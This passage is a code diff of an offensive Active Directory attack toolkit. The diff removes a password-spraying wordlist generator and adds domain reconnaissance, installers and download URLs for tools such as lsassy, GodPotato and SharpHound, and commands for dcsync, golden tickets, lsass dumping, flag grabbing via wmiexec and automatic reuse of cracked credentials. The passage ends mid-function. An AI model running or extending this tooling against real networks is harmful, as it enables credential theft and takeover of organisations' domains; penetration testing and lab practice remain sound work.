-        patterns.add(base.upper())
-        patterns.add(base.capitalize())
-
-        # strip trailing digits/specials to get root word
-        root = base.rstrip(_str.digits + _str.punctuation)
-        if root and root != base:
-            patterns.add(root)
-
-        # common suffixes
-        for suffix in ['!','!!','1','2','12','123','1234','#',
-                       str(current_year), str(current_year+1),
-                       str(current_year)[-2:], '01','@','$',
-                       '!1','!2','!123','!@#','*']:
-            patterns.add(base + suffix)
-            if root: patterns.add(root + suffix)
-
-        # common prefixes
-        for prefix in ['!','P@ssw0rd','Welcome','Admin']:
-            patterns.add(prefix + base)
-
-        # leet speak substitutions
-        leet = base.replace('a','@').replace('e','3').replace('i','1').replace('o','0').replace('s','$')
-        if leet != base:
-            patterns.add(leet)
-            patterns.add(leet + '!')
-            patterns.add(leet + '1')
-
-        # seasonal variants
-        for season in ['Spring','Summer','Autumn','Winter','Fall']:
-            for yr in [str(current_year), str(current_year+1), str(current_year)[-2:]]:
-                patterns.add(f'{season}{yr}')
-                patterns.add(f'{season}{yr}!')
-
-    # remove empty/short
-    patterns = sorted(p for p in patterns if len(p) >= 3)
-
-    out_path = os.path.join(loot_dir, 'patterns.txt')
-    with open(out_path, 'w') as f:
-        f.write('\n'.join(patterns) + '\n')
-
-    log(f'{GREEN}{len(patterns)} password patterns generated → {WHITE}{out_path}{RESET}', 'success')
-    log(f'{GREY}Use with: spray → wordlist > {out_path}{RESET}', 'info')
-    return out_path
-
 
 def show_loot(target):
     hr()
@@ -9873,124 +12353,256 @@ def do_clockskew(target):
     hr()
 
 def _autodiscover(target):
-    """Auto-detect domain, DC fqdn from DC IP using multiple methods."""
+    """Auto-discover domain, FQDN, OS, forest, clock skew from DC IP."""
     import re as _re_ad, subprocess as _sp_ad, shutil as _sh_ad
     if not target.dc: return
 
-    log(f'Auto-discovering domain/DC info from {WHITE}{target.dc}{RESET}...','info')
+    hr()
+    log(f'{C0}Auto-discovery{RESET} — probing {WHITE}{target.dc}{RESET}...','info')
+    print()
 
-    # Method 1: LDAP rootDSE (zero-auth, most reliable)
-    if not target.domain and _sh_ad.which('ldapsearch'):
+    def _probe(label, fn):
         try:
-            out = subprocess.check_output(
-                ['ldapsearch','-x','-H',f'ldap://{target.dc}',
-                 '-s','base','-b','','defaultNamingContext'],
-                text=True, stderr=subprocess.DEVNULL, timeout=5)
+            result = fn()
+            if result:
+                log(f'{label:<22} {GREEN}✓{RESET}  {WHITE}{result}{RESET}','info')
+                return result
+        except Exception as e:
+            _logfile(f'autodiscover {label}: {e}')
+        log(f'{label:<22} {GREY}—{RESET}','info')
+        return None
+
+    # ── 1. LDAP reachability + rootDSE ───────────────────────────────────────
+    def _ldap_rootdse():
+        if not _sh_ad.which('ldapsearch'): return None
+        out = subprocess.check_output(
+            ['ldapsearch','-x','-H',f'ldap://{target.dc}',
+             '-s','base','-b','',
+             'defaultNamingContext','rootDomainNamingContext',
+             'dnsHostName','ldapServiceName','forestFunctionality'],
+            text=True, stderr=subprocess.DEVNULL, timeout=6)
+        # domain
+        if not target.domain:
             m = re.search(r'defaultNamingContext:\s*(DC=.+)', out, re.I)
             if m:
-                dom = m.group(1).replace('DC=','').replace(',','.').lower()
-                target.domain = dom
-                log(f'Domain via LDAP rootDSE → {WHITE}{dom}{RESET}','success')
-        except Exception: pass
-
-    # Method 2: SMB null session banner (nxc)
-    if not target.domain:
-        nxc = check_tool('netexec','nxc','crackmapexec','cme')
-        if nxc:
-            try:
-                out = subprocess.check_output(
-                    [nxc,'smb',target.dc,'-u','','-p',''],
-                    text=True, stderr=subprocess.DEVNULL, timeout=8)
-                m = re.search(r'domain:([A-Z0-9._-]+)', out, re.I)
-                if m:
-                    dom = m.group(1).lower()
-                    if '.' in dom:
-                        target.domain = dom
-                        log(f'Domain via SMB null → {WHITE}{dom}{RESET}','success')
-            except Exception: pass
-
-    # Method 3: resolv.conf search/domain directive
-    if not target.domain:
-        try:
-            for line in open('/etc/resolv.conf', errors='replace').read().splitlines():
-                if line.startswith(('search ','domain ')):
-                    dom = line.split()[1].strip().lower()
-                    if '.' in dom and not dom.endswith(('.internal','.amazonaws.com','.compute.internal')):
-                        target.domain = dom
-                        log(f'Domain via resolv.conf → {WHITE}{dom}{RESET}','success')
-                        break
-        except Exception: pass
-
-    # DC FQDN: reverse DNS first, then SMB banner, then nmap
-    if not target.dc_fqdn and target.domain:
-        # Reverse DNS
-        if _sh_ad.which('dig'):
-            try:
-                out = subprocess.check_output(
-                    ['dig','+short','-x',target.dc],
-                    text=True, stderr=subprocess.DEVNULL, timeout=5)
-                fqdn = out.strip().splitlines()[0].rstrip('.') if out.strip() else ''
-                if fqdn and target.domain in fqdn:
-                    target.dc_fqdn = fqdn
-                    log(f'DC FQDN via reverse DNS → {WHITE}{fqdn}{RESET}','success')
-            except Exception: pass
-
-        # SMB banner hostname
+                target.domain = m.group(1).replace('DC=','').replace(',','.').lower()
+        # fqdn
         if not target.dc_fqdn:
-            nxc = check_tool('netexec','nxc','crackmapexec','cme')
-            if nxc:
-                try:
-                    out = subprocess.check_output(
-                        [nxc,'smb',target.dc],
-                        text=True, stderr=subprocess.DEVNULL, timeout=8)
-                    m = re.search(r'name:([A-Z0-9_-]+)', out, re.I)
-                    if m:
-                        hostname = m.group(1).strip()
-                        fqdn = f'{hostname}.{target.domain}'
-                        target.dc_fqdn = fqdn
-                        log(f'DC FQDN via SMB banner → {WHITE}{fqdn}{RESET}','success')
-                except Exception: pass
+            m = re.search(r'dnsHostName:\s*(\S+)', out, re.I)
+            if m: target.dc_fqdn = m.group(1).strip().lower()
+        # forest
+        m = re.search(r'rootDomainNamingContext:\s*(DC=.+)', out, re.I)
+        forest = m.group(1).replace('DC=','').replace(',','.').lower() if m else ''
+        # forest functional level
+        m2 = re.search(r'forestFunctionality:\s*(\d+)', out, re.I)
+        fl_map = {'0':'2000','1':'2003','2':'2003R2','3':'2008','4':'2008R2',
+                  '5':'2012','6':'2012R2','7':'2016','8':'2019','9':'2022'}
+        fl = fl_map.get(m2.group(1),'?') if m2 else '?'
+        return f'domain={target.domain} fqdn={target.dc_fqdn} forest={forest} FL={fl}'
 
-    # DC IP from SRV record if domain set but no DC yet
-    if not target.dc and target.domain and _sh_ad.which('dig'):
-        try:
-            out = subprocess.check_output(
-                ['dig','+short','SRV',f'_ldap._tcp.dc._msdcs.{target.domain}'],
+    ldap_result = _probe('LDAP rootDSE', _ldap_rootdse)
+
+    # ── 2. SMB banner (OS + hostname fallback) ────────────────────────────────
+    def _smb_banner():
+        nxc = check_tool('netexec','nxc')
+        if not nxc: return None
+        out = subprocess.check_output(
+            [nxc,'smb',target.dc,'-u','','-p',''],
+            text=True, stderr=subprocess.DEVNULL, timeout=8)
+        m_os   = re.search(r'Windows[^\)]+', out)
+        m_name = re.search(r'name:([A-Z0-9_-]+)', out, re.I)
+        m_sign = re.search(r'signing:(True|False)', out, re.I)
+        m_smb1 = re.search(r'SMBv1:(True|False)', out, re.I)
+        # fallback domain/fqdn from SMB
+        if not target.domain:
+            m_dom = re.search(r'domain:([A-Z0-9._-]+)', out, re.I)
+            if m_dom: target.domain = m_dom.group(1).lower()
+        if not target.dc_fqdn and m_name and target.domain:
+            target.dc_fqdn = f'{m_name.group(1)}.{target.domain}'.lower()
+        os_str    = m_os.group(0).strip() if m_os else '?'
+        sign_str  = f'signing={m_sign.group(1)}' if m_sign else ''
+        smb1_str  = f'SMBv1={m_smb1.group(1)}' if m_smb1 else ''
+        return ' · '.join(filter(None,[os_str,sign_str,smb1_str]))
+
+    _probe('SMB banner', _smb_banner)
+
+    # ── 3. DNS reverse lookup ─────────────────────────────────────────────────
+    def _reverse_dns():
+        if not _sh_ad.which('dig') and not _sh_ad.which('nslookup'): return None
+        if _sh_ad.which('dig'):
+            out = subprocess.check_output(['dig','+short','-x',target.dc],
                 text=True, stderr=subprocess.DEVNULL, timeout=5)
-            lines = sorted(out.strip().splitlines())
-            if lines:
-                host = lines[0].split()[-1].rstrip('.')
-                out2 = subprocess.check_output(
-                    ['dig','+short','A',host],
-                    text=True, stderr=subprocess.DEVNULL, timeout=5)
-                ip = out2.strip().splitlines()[0] if out2.strip() else ''
-                if ip:
-                    target.dc = ip
-                    if not target.dc_fqdn: target.dc_fqdn = host
-                    log(f'DC IP via DNS SRV → {WHITE}{ip}{RESET} ({host})','success')
-        except Exception: pass
+            fqdn = out.strip().splitlines()[0].rstrip('.') if out.strip() else ''
+        else:
+            out = subprocess.check_output(['nslookup',target.dc],
+                text=True, stderr=subprocess.DEVNULL, timeout=5)
+            m = re.search(r'name\s*=\s*(\S+)', out, re.I)
+            fqdn = m.group(1).rstrip('.') if m else ''
+        if fqdn and not target.dc_fqdn:
+            target.dc_fqdn = fqdn.lower()
+        return fqdn or None
+
+    _probe('Reverse DNS', _reverse_dns)
+
+    # ── 4. Clock skew check ───────────────────────────────────────────────────
+    def _clock_skew():
+        if not _sh_ad.which('nmap'): return None
+        out = subprocess.check_output(
+            ['nmap','-sn','-Pn','--script','clock-skew',target.dc],
+            text=True, stderr=subprocess.DEVNULL, timeout=10)
+        m = re.search(r'clock-skew:\s*mean\s+(-?\d+s)', out, re.I)
+        if m:
+            skew = m.group(1)
+            target.skew = skew
+            return f'{skew} offset'
+        # fallback: compare ntpdate
+        if _sh_ad.which('ntpdate'):
+            out2 = subprocess.check_output(
+                ['ntpdate','-q',target.dc],
+                text=True, stderr=subprocess.DEVNULL, timeout=6)
+            m2 = re.search(r'offset\s+([+-]?\d+\.\d+)', out2, re.I)
+            if m2:
+                skew_s = float(m2.group(1))
+                skew_str = f'{skew_s:+.1f}s'
+                target.skew = skew_str
+                if abs(skew_s) > 300:
+                    return f'{skew_str} {ORANGE}WARNING: >5min skew — Kerberos will fail{RESET}'
+                return skew_str
+        return None
+
+    _probe('Clock skew', _clock_skew)
+
+    # ── 5. Port scan — key AD ports ───────────────────────────────────────────
+    def _port_check():
+        ports = {88:'Kerberos', 389:'LDAP', 445:'SMB', 5985:'WinRM', 3389:'RDP'}
+        open_ports = []
+        import socket as _sock
+        for port, name in ports.items():
+            try:
+                s = _sock.create_connection((target.dc, port), timeout=1)
+                s.close()
+                open_ports.append(f'{port}/{name}')
+            except Exception: pass
+        return '  '.join(open_ports) if open_ports else None
+
+    _probe('Open ports', _port_check)
+
+    # ── 6. DNS SRV — find other DCs ──────────────────────────────────────────
+    def _dns_srv():
+        if not _sh_ad.which('dig') or not target.domain: return None
+        out = subprocess.check_output(
+            ['dig','+short','SRV',f'_ldap._tcp.dc._msdcs.{target.domain}'],
+            text=True, stderr=subprocess.DEVNULL, timeout=5)
+        hosts = [l.split()[-1].rstrip('.') for l in out.strip().splitlines() if l.strip()]
+        return ', '.join(hosts[:3]) if hosts else None
+
+    _probe('DC SRV records', _dns_srv)
+
+    # ── 7. WinRM / ADWS check ────────────────────────────────────────────────
+    def _winrm_check():
+        import socket as _sock
+        results = []
+        for port, name in [(5985,'WinRM'), (5986,'WinRM-S'), (9389,'AD-WS')]:
+            try:
+                s = _sock.create_connection((target.dc, port), timeout=1)
+                s.close()
+                results.append(f'{name}:{port}')
+            except Exception: pass
+        return '  '.join(results) if results else None
+
+    _probe('Remote mgmt', _winrm_check)
+
+    # ── Summary ───────────────────────────────────────────────────────────────
+    print()
+    log(f'{GREEN}Auto-discovery complete{RESET}','success')
+    if target.domain:   log(f'  domain  → {WHITE}{target.domain}{RESET}','info')
+    if target.dc_fqdn:  log(f'  fqdn    → {WHITE}{target.dc_fqdn}{RESET}','info')
+    if getattr(target,'skew',None):     log(f'  skew    → {WHITE}{target.skew}{RESET}','info')
+    print()
+
+    # auto-write krb5.conf now that we have the domain
+    if target.domain and target.dc:
+        _write_krb5(target)
+
+    # suggest next steps
+    log(f'Suggested next steps:','info')
+    if not target.user:
+        print(f'  {C0}→ set{RESET}  {GREY}add credentials{RESET}')
+        print(f'  {C0}→ unauth{RESET}  {GREY}enumerate without creds{RESET}')
+        print(f'  {C0}→ kerbrute{RESET}  {GREY}user enumeration{RESET}')
+    else:
+        print(f'  {C0}→ enum{RESET}  {GREY}full enumeration with creds{RESET}')
+        print(f'  {C0}→ aclscan{RESET}  {GREY}instant ACL vulnerability scan{RESET}')
+        print(f'  {C0}→ adrecon{RESET}  {GREY}BloodHound collection{RESET}')
+    hr()
+
 
 def set_target(target):
     hr()
-    print(f'\n  {C0}{BOLD}set target{RESET}  {GREY}leave blank to keep current{RESET}\n')
+    print(f'\n  {C0}{BOLD}set target{RESET}  {GREY}leave blank to keep · tab completes{RESET}\n')
     # read current api key from env
-    _cur_key = os.environ.get('ANTHROPIC_API_KEY','')
+    _cur_key  = os.environ.get('ANTHROPIC_API_KEY','')
     _key_hint = _cur_key[:8]+'...' if _cur_key else ''
-    fields = [('domain   ',target.domain,'domain.local'),('dc IP    ',target.dc,'10.10.10.1'),
-              ('dc fqdn  ',target.dc_fqdn,'dc01.domain.local  (auto-filled if blank)'),
-              ('username ',target.user,'user'),('password ',target.password,''),('NT hash  ',target.hash,''),
-              ('api key  ',_key_hint,'sk-ant-... (for hint/explain/autopwn AI features)')]
-    for label,cur,example in fields:
-        hint = f'{GREY}[{cur}]{RESET} ' if cur else f'{GREY}e.g. {example}{RESET} '
-        try: v = input(f'  {C0}{label}{RESET} {hint}> ').strip()
-        except (EOFError,KeyboardInterrupt): break
+    _changed  = []
+
+    fields = [
+        ('domain   ', target.domain,   'domain.local'),
+        ('dc IP    ', target.dc,        '10.10.10.1'),
+        ('dc fqdn  ', target.dc_fqdn,   'dc01.domain.local  (auto-filled)'),
+        ('username ', target.user,      'user'),
+        ('password ', target.password,  ''),
+        ('NT hash  ', target.hash,      ''),
+        ('api key  ', _key_hint,        'sk-ant-...'),
+    ]
+
+    # show current state summary before prompting
+    print(f'  {GREY}current:{RESET}', end='')
+    parts = []
+    if target.domain:   parts.append(f'{GREY}domain={WHITE}{target.domain}{RESET}')
+    if target.dc:       parts.append(f'{GREY}dc={WHITE}{target.dc}{RESET}')
+    if target.user:     parts.append(f'{GREY}user={GREEN}{target.user}{RESET}')
+    if target.password: parts.append(f'{GREY}pass={GREEN}***{RESET}')
+    if target.hash:     parts.append(f'{GREY}hash={GREEN}***{RESET}')
+    print('  ' + '  '.join(parts) if parts else f'  {GREY}(not set){RESET}')
+    print()
+
+    for label, cur, example in fields:
+        # color-code current value: green if set, dim if not
+        if cur:
+            disp = cur if 'pass' not in label and 'hash' not in label and 'api' not in label else '***'
+            hint = f'{GREEN}[{disp}]{RESET} '
+        else:
+            hint = f'{GREY}e.g. {example}{RESET} ' if example else ''
+        try:
+            v = input(f'  {C0}{label}{RESET} {hint}> ').strip()
+        except (EOFError, KeyboardInterrupt):
+            break
         if not v: continue
-        if 'domain' in label:   target.domain   = v
-        elif 'fqdn' in label:   target.dc_fqdn  = v
-        elif 'dc'   in label:   target.dc       = v
-        elif 'user' in label:   target.user     = v
-        elif 'pass' in label:   target.password = v; target.hash = None
-        elif 'hash' in label:   target.hash     = v; target.password = None
+
+        old_val = cur
+        if 'domain' in label:
+            target.domain   = v
+            if v != old_val: _changed.append(f'domain→{v}')
+        elif 'fqdn' in label:
+            target.dc_fqdn  = v
+            if v != old_val: _changed.append(f'fqdn→{v}')
+        elif 'dc'   in label:
+            old_dc = target.dc
+            if v: target.dc = v
+            effective_dc = v or target.dc
+            if effective_dc and (v != old_dc or not target.dc_fqdn):
+                log(f'{GREY}DC set — running auto-discovery...{RESET}','info')
+                _autodiscover(target)
+            if v != old_dc: _changed.append(f'dc→{v}')
+        elif 'user' in label:
+            target.user     = v
+            if v != old_val: _changed.append(f'user→{v}')
+        elif 'pass' in label:
+            target.password = v; target.hash = None
+            _changed.append('password set')
+        elif 'hash' in label:
+            target.hash     = v; target.password = None
+            _changed.append('hash set')
         elif 'api'  in label:
             os.environ['ANTHROPIC_API_KEY'] = v
             # save to ~/.segfault_target
@@ -10012,6 +12624,8 @@ def set_target(target):
         target.dc_fqdn = f'dc01.{target.domain}'
         log(f'dc fqdn guessed as {WHITE}{target.dc_fqdn}{RESET} — override with set','warn')
     hr()
+    if _changed:
+        log(f'{GREEN}Changed: {RESET}{GREY}{", ".join(_changed)}{RESET}','success')
     log(f'Target: {target.summary()}','success')
     # auto-write krb5.conf if we have enough info
     if target.domain and target.dc:
@@ -10071,6 +12685,12 @@ PIP_PKGS = [
     ('coercer',       'coercer'),
     ('ldap3',         'ldap3'),
     ('netexec',       'netexec'),
+    ('abuseACL',      'abuseACL'),
+    ('lsassy',        'lsassy'),
+    ('autobloody',    'autobloody'),
+    ('pywsus',        'pywsus'),
+    ('smbclientng',   'smbclientng'),
+    ('powerview',     'powerview'),
 ]
 
 # apt packages — (package_name, binary_to_check)
@@ -10109,6 +12729,13 @@ GIT_REPOS = [
     ('gMSADumper',       'https://github.com/micahvandeusen/gMSADumper',        None, 'gMSADumper.py'),
     ('pre2k',            'https://github.com/garrettfoster13/pre2k',            'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'pre2k.py'),
     ('AADInternals',     'https://github.com/Gerenios/AADInternals',            None, 'AADInternals.psm1'),
+    ('sccmhunter',       'https://github.com/garrettfoster13/sccmhunter',       'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'sccmhunter.py'),
+    ('pxethiefy',        'https://github.com/sse-secure-systems/Active-Directory-Spotlights', None, 'pxethiefy.py'),
+    ('SystemDPAPIdump',  'https://github.com/fortra/impacket',                  None, 'SystemDPAPIdump.py'),
+    ('abuseACL',         'https://github.com/AetherBlack/abuseACL',             'pip install . --break-system-packages 2>/dev/null; true', 'abuseACL'),
+    ('ADCSKiller',       'https://github.com/grimsec/ADCSKiller',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'ADCSKiller.py'),
+    ('Grouper2',         'https://github.com/l0ss/Grouper2',                    None, 'Grouper2.exe'),
+    ('ACLight',          'https://github.com/cyberark/ACLight',                  None, 'ACLight2.ps1'),
 ]
 
 # Windows binaries — downloaded to ~/.segfault-ad/tools/win/
@@ -10128,7 +12755,8 @@ WIN_BINS = [
     ('winPEASx64.exe',       'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe',                                       'exe'),
     ('SharpUp.exe',          'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe',                                  'exe'),
     ('Seatbelt.exe',         'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe',                                 'exe'),
-    ('SharpHound.exe',       'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',                                       'exe'),
+    ('Snaffler.exe',         'https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe',                                           'exe'),
+    ('SharpHound.exe',       'https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound.exe',                                       'exe'),
     ('GodPotato-NET4.exe',   'https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe',                               'exe'),
     # PowerShell scripts
     ('PowerView.ps1',        'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1',                                      'exe'),
@@ -10160,6 +12788,26 @@ def _git_installed(name, binary):
             if binary in files: return True
         return True
     return False
+
+def _show_plugins():
+    """Show loaded plugins from ~/.segfault-ad/plugins/."""
+    hr()
+    plugin_files = [f for f in os.listdir(CFG.PLUGINS) if f.endswith('.py') and not f.startswith('_')] if os.path.isdir(CFG.PLUGINS) else []
+    if not plugin_files:
+        log(f'No plugins found in {WHITE}{CFG.PLUGINS}{RESET}','info')
+        log(f'{GREY}Create a .py file in that dir with a register_plugin(modules) function or PLUGIN_MODULES list{RESET}','info')
+    else:
+        log(f'{GREEN}{len(plugin_files)} plugin(s) in {WHITE}{CFG.PLUGINS}{RESET}','success')
+        for f in plugin_files:
+            print(f'  {C0}■{RESET} {f}')
+    log(f'{GREY}Example plugin:{RESET}','info')
+    print(f"""  {GREY}# ~/.segfault-ad/plugins/myplugin.py
+  class MyModule(Module):
+      name='mymod'; description='custom module'; category='recon'
+      def run(self, target): ...
+  PLUGIN_MODULES = [MyModule]{RESET}""")
+    hr()
+
 
 def run_install():
     hr()
@@ -10471,19 +13119,74 @@ CMDS = sorted(list(MODULES.keys()) + ['check','tools',
     'set','pivot','workspace','ws','target','modules','run','loot','report',
     'flag','flags','tgt','hint','h','explain','ex','autopwn','ap','b64get','healthcheck','db',
     'clockskew','install','clear','exit','quit','q','help','?',
-    'history','search'
+    'history','search',
+    'hivemind','hivemind upload','sccm','trusts','aclscan','adcskiller','grouper2','aclight','lsassy','bh-view','snaffler','pywsus','export','import','targets','smbclientng','powerview',
 ])
 
+def _get_workspaces():
+    """Get list of workspace names from disk."""
+    ws_dir = os.path.expanduser('~/.segfault-ad/workspaces')
+    if not os.path.isdir(ws_dir): return []
+    return sorted([d for d in os.listdir(ws_dir)
+                   if os.path.isdir(os.path.join(ws_dir, d))])
+
+
 def ad_completer(text, state):
-    # command completion
+    line  = readline.get_line_buffer()
+    parts = line.split()
+
+    # subcommand completion
+    ws_names = _get_workspaces()
+    subcmds = {
+        'hivemind':  ['upload', 'status'],
+        'ws':        ['new', 'load', 'list', 'save', 'delete'] + ws_names,
+        'workspace': ['new', 'load', 'list', 'save', 'delete'] + ws_names,
+        'bloody':    ['resetpwd','addtogroup','dcsync-rights','adduser','addself',
+                      'writeowner','genericall','setrbcd','enableaccount'],
+        'exec':      ['winrm','smb','ssh'],
+        'relay':     ['smb','ldap','adcs','socks'],
+        'certipy':   ['find','esc1','esc4','esc6','esc7','esc8','shadow','forge','auth'],
+        'nxcmodules':['rid','users','shares','spider','pass-pol','loggedon'],
+        'adrecon':   ['All','DCOnly','LoggedOn','Session','Acl'],
+        'powerview':  ['interactive','users','groups','acl','spns','asrep','trusts',
+                       'computers','gpo','ca','shadow','rbcd','vuln','recon'],
+        'smbclientng':['interactive','command','shares','spider'],
+        'mssql':     ['enum','hash','linked','cmd','privesc'],
+        'shares':    ['auto','manual','spider'],
+        'certipy':   ['find','esc1','esc4','esc6','esc7','esc8','shadow','forge','auth'],
+        'dcsync':    ['all','user'],
+        'sliver':    [],
+        'pathpwn':   [],
+        'aclscan':   ['current','principal','file','extends'],
+        'trusts':    ['enum','sidhistory','golden','crossforest'],
+        'sccm':      ['enum','naa','dpapi','pxe','admin'],
+        'lsassy':    ['comsvcs','procdump','dumpert'],
+    }
+
+    # ws load/delete <TAB> → show workspace names
+    if len(parts) >= 2:
+        cmd = parts[0].lower()
+        sub = parts[1].lower() if len(parts) > 1 else ''
+        # ws load/delete → complete with workspace names
+        if cmd in ('ws','workspace') and sub in ('load','delete','save') and len(parts) >= 3:
+            m = [w for w in ws_names if w.startswith(text)]
+            return m[state] if state < len(m) else None
+        if cmd in subcmds:
+            m = [s for s in subcmds[cmd] if s.startswith(text)]
+            return m[state] if state < len(m) else None
+
+    # top-level command completion
     m = [c for c in CMDS if c.startswith(text)]
-    # file path completion if text looks like a path
+
+    # file path completion
     if not m and ('/' in text or text.startswith('~')):
         import glob as _glc
         expanded = os.path.expanduser(text)
         paths = _glc.glob(expanded + '*')
         m = [p + ('/' if os.path.isdir(p) else '') for p in paths]
+
     return m[state] if state < len(m) else None
+
 
 readline.set_completer(ad_completer)
 readline.parse_and_bind('tab: complete')
@@ -10746,7 +13449,7 @@ def do_autopwn(target):
         cracked = open(os.path.join(target.loot_dir,'cracked.txt')).read().splitlines() if os.path.exists(os.path.join(target.loot_dir,'cracked.txt')) else []
         users_f = open(os.path.join(target.loot_dir,'users.txt')).read().splitlines() if os.path.exists(os.path.join(target.loot_dir,'users.txt')) else []
         try:
-            data = _load_bh(target.loot_dir)
+            data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
         except Exception:
             data = {'users':[],'groups':[],'computers':[]}
         bh_users = [u.get('Properties',{}).get('name','').split('@')[0] for u in data['users']][:30]
@@ -11997,6 +14700,7 @@ def show_help():
             ('run <module>','run a module against the current target'),
             ('<module>','shorthand -- type module name directly, no run needed'),
             ('install','install all dependencies -- pip, apt, git repos'),
+            ('hivemind','show Hivemind rack status / hivemind upload <file> → tool server'),
             ('check  [tools]','scan all required tools — show installed/missing with install commands'),
             ('hint  [h]','AI: paste error/situation — Claude suggests next steps'),
             ('explain [ex]','AI: explain any BloodHound edge, ACE, or AD concept'),
@@ -12055,6 +14759,20 @@ def repl():
                 log(f'{GREY}{_tb.format_exc().splitlines()[-2].strip()}{RESET}','warn')
         elif cmd == 'loot':     show_loot(TARGET)
         elif cmd == 'report':   _gen_report(TARGET)
+        elif cmd == 'export':
+            _export_session(TARGET)
+        elif cmd == 'import':
+            path = args[0] if args else input_field('session file path','')
+            if path: _import_session(TARGET, path)
+        elif cmd == 'targets':
+            _multi_target(TARGET, args)
+        elif cmd == 'hivemind':
+            if args and args[0] == 'upload' and len(args) > 1:
+                hivemind_upload(args[1])
+            else:
+                hivemind_status()
+        elif cmd == 'bh-view':
+            _bh_view(TARGET)
         elif cmd == 'db':
             hr()
             sub = args[0] if args else 'help'
@@ -12157,6 +14875,50 @@ def repl():
             hr()
         elif cmd == 'flag':
             hr()
+            # check if flags already captured manually via args
+            if args and len(args) >= 1:
+                val = args[0]
+                ftype = 'root' if TARGET.user and TARGET.user.lower() in ('administrator','root') else 'user'
+                if len(args) >= 2: ftype = args[0]; val = args[1]
+                fname = f'{ftype}.txt'
+                open(os.path.join(TARGET.loot_dir, fname),'w').write(val+'\n')
+                log(f'{GREEN}{ftype}: {val}{RESET}','success')
+                add_result('flag', f'{ftype}:{val[:8]}…')
+                hr(); continue
+
+            # quick manual entry option
+            manual = input_field('paste flag manually (or press enter to auto-grab)','')
+            if manual and re.match(r'^[0-9a-f]{32}$', manual.strip(), re.I):
+                val = manual.strip()
+                ftype = 'root' if TARGET.user and TARGET.user.lower() == 'administrator' else 'user'
+                ftype = input_field('flag type','root' if ftype == 'root' else 'user')
+                open(os.path.join(TARGET.loot_dir,f'{ftype}.txt'),'w').write(val+'\n')
+                log(f'{GREEN}{ftype}: {val}{RESET}','success')
+                add_result('flag', f'{ftype}:{val[:8]}…')
+                # check if both flags now exist
+                user_f = os.path.join(TARGET.loot_dir,'user.txt')
+                root_f = os.path.join(TARGET.loot_dir,'root.txt')
+                if os.path.exists(user_f) and os.path.exists(root_f):
+                    _user_flag = open(user_f).read().strip()
+                    _root_flag = open(root_f).read().strip()
+                    _dom  = (TARGET.domain or 'UNKNOWN').upper()
+                    _hash = f':{TARGET.hash}' if TARGET.hash else TARGET.password or '?'
+                    print(f"""
+{C0}         _,.-----.,_{RESET}
+{C0}       ,-~           ~-.{RESET}
+{C0}      ,^___           ___^.{RESET}
+{C0}    /~\"   ~\"   .   \"~   \"~\\{RESET}     {WHITE}{BOLD}{_dom}{RESET} {GREY}— TURNED OVER{RESET}
+{C0}   Y  ,--._    I    _.--.  Y{RESET}     {GREY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
+{C0}    | Y     ~-. | ,-~     Y |{RESET}    {GREY}user  {RESET}{GREEN}{_user_flag}{RESET}
+{C0}    | |        }}:{{        | |{RESET}    {GREY}root  {RESET}{GREEN}{_root_flag}{RESET}
+{C0}    j l       / | \\       ! l{RESET}    {GREY}creds {RESET}{WHITE}{_hash}{RESET}
+{C0} .-~  (__,.--\" .^. \"--.,__)  ~-.{RESET}
+{C0}(           / / | \\ \\           ){RESET}
+{C0} \\.____,   ~  \\/\"\\"/  ~   .____,/{RESET} {GREY}KEYS TO THE KINGDOM. CHEERS.{RESET}
+{C0}  ^.____                 ____.^{RESET}
+""")
+                hr(); continue
+
             log('Grabbing flags via wmiexec...','info')
             wmi = check_tool('impacket-wmiexec','wmiexec.py')
             if not wmi:
@@ -12390,16 +15152,199 @@ def repl():
             hr()
         elif cmd == 'clockskew': do_clockskew(TARGET)
         elif cmd == 'install':  run_install()
+        elif cmd == 'plugins':  _show_plugins()
         elif cmd == 'clear':    os.system('clear')
         elif cmd in ('exit','quit','q'): sys.stdout.write('\033[r'); sys.stdout.flush(); log('Exiting','info'); sys.exit(0)
         elif cmd in MODULES:
-            try: MODULES[cmd]().run(TARGET)
-            except (EOFError,KeyboardInterrupt): print(); log('Cancelled','warn')
+            try:
+                mod_instance = MODULES[cmd]()
+                if not mod_instance.check_cache(TARGET):
+                    continue
+                mod_instance.run(TARGET)
+                # mark as done with last session result as summary
+                last = _SESSION_RESULTS[-1] if _SESSION_RESULTS else {}
+                mod_instance.mark_done(TARGET, last.get('detail','') if last.get('module')==cmd else '')
+            except (EOFError,KeyboardInterrupt):
+                print()
+                log(f'Module interrupted — returning to REPL','warn')
+                with _ACTIVE_PROCS_L:
+                    for _p in list(_ACTIVE_PROCS):
+                        try: _p.terminate()
+                        except Exception: pass
+                    _ACTIVE_PROCS.clear()
             except Exception as exc:
                 import traceback as _tb
+                full_tb = _tb.format_exc()
                 log(f'Module error: {exc}','error')
-                log(f'{GREY}{_tb.format_exc().splitlines()[-2].strip()}{RESET}','warn')
+                log(f'{GREY}{full_tb.splitlines()[-2].strip()}{RESET}','warn')
+                _logfile(f'MODULE ERROR [{cmd}]:\n{full_tb}','error')
+                if os.environ.get('SEGFAULT_DEBUG'):
+                    for l in full_tb.splitlines(): print(f'  {GREY}{l}{RESET}')
         else: log(f'Unknown: {cmd} -- type help','warn')
+
+
+def _auto_cred_reuse(target, new_user, new_pass=None, new_hash=None):
+    """After cracking a new credential, auto-retry key modules with it.
+    Runs: ldapenum, asreproast, kerberoast, shares, nxcmodules users — in background."""
+    if not new_user: return
+    log(f'{PINK}[auto-reuse]{RESET} New cred {WHITE}{new_user}{RESET} — retrying enum modules...','info')
+
+    import copy as _copy
+    fake = _copy.copy(target)
+    fake.user     = new_user
